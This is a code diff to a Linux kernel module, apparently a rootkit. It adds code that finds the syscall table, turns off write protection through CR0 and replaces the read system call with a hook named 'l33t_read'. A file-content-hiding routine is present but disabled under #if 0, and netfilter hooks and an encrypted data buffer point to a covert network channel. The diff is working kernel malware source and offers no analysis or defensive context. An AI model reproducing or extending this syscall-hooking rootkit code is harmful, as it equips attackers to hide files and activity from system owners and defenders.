@@ -40,6 +40,8 @@ static struct seqack seq_history[10];
 unsigned char* buffer;
 unsigned char* encrypted_test_data;
 
+unsigned long *sct;
+
 size_t data_len;
 size_t bit_count = 0;
 size_t byte_count = 0;
@@ -513,14 +515,51 @@ unsigned long* find_sys_call_table(void) {
 }
 #endif
 
-void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size) {
-    	char *p;
+asmlinkage ssize_t (*o_read)(unsigned int fd, char __user* buf, size_t count);
+asmlinkage ssize_t l33t_read(unsigned int fd, char __user* buf, size_t count);
 
-    	for(p = (char *)haystack; p <= ((char *)haystack - needle_size + haystack_size); p++) {
-            printk(KERN_INFO "sct offset pointer %p\n", (void*) p);
-        	if(memcmp(p, needle, needle_size) == 0) return (void *)p;
-    	}
-    	return NULL;
+asmlinkage ssize_t l33t_read(unsigned int fd, char __user* buf, size_t count) {
+    struct file* f;
+    int fput_needed;
+    ssize_t ret;
+    ret = o_read(fd, buf, count);
+
+#if 0
+    if (hide_file_content) {
+        ret = -EBADF;
+
+        atomic_set(&read_on, 1);
+        f = e_fget_light(fd, &fput_needed);
+
+        if (f) {
+#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 14, 0)
+            ret = vfs_read(f, buf, count, &f->f_pos);
+#else
+            ret = vfs_read_addr(f, buf, count, &f->f_pos);
+#endif
+            if (f_check(buf, ret) == 1)
+                ret = hide_content(buf, ret);
+
+            fput_light(f, fput_needed);
+        }
+        atomic_set(&read_on, 0);
+    } else {
+        ret = o_read(fd, buf, count);
+    }
+#endif
+
+    return ret;
+}
+
+void* memmem(const void* haystack, size_t haystack_size, const void* needle, size_t needle_size) {
+    char* p;
+
+    for (p = (char*) haystack; p <= ((char*) haystack - needle_size + haystack_size); p++) {
+        printk(KERN_INFO "sct offset pointer %p\n", (void*) p);
+        if (memcmp(p, needle, needle_size) == 0)
+            return (void*) p;
+    }
+    return NULL;
 }
 
 unsigned long* find_sys_call_table(void) {
@@ -539,7 +578,7 @@ unsigned long* find_sys_call_table(void) {
     printk(KERN_INFO "sct offset %p\n", (void*) sct_off);
 
     //p = (char**) memmem(code, sizeof(code), "\xff\x14\xc5", 3);
-    p = (char **) sct_off;
+    p = (char**) sct_off;
 
     if (p) {
         unsigned long* table = *(unsigned long**) ((char*) p + 3);
@@ -553,6 +592,15 @@ static int __init mod_init(void) {
     int err;
 
     printk(KERN_INFO "Kernel syscall table address %p\n", (void*) find_sys_call_table());
+
+    sct = (unsigned long *) find_sys_call_table();
+
+    o_read = (void*) sct[__NR_read];
+
+    write_cr0(read_cr0() & (~0x10000));
+    sct[__NR_read] = (unsigned long) l33t_read;
+    write_cr0(read_cr0() | 0x10000);
+
     return 0;
 
     memset(&seq_history, 0, sizeof(struct seqack) * 10);
@@ -599,6 +647,9 @@ static int __init mod_init(void) {
 }
 
 static void __exit mod_exit(void) {
+    write_cr0(read_cr0() & (~0x10000));
+    sct[__NR_read] = (unsigned long) o_read;
+    write_cr0(read_cr0() | 0x10000);
     return;
     nf_unregister_net_hook(&init_net, &nfho);
     nf_unregister_net_hook(&init_net, &nfhi);
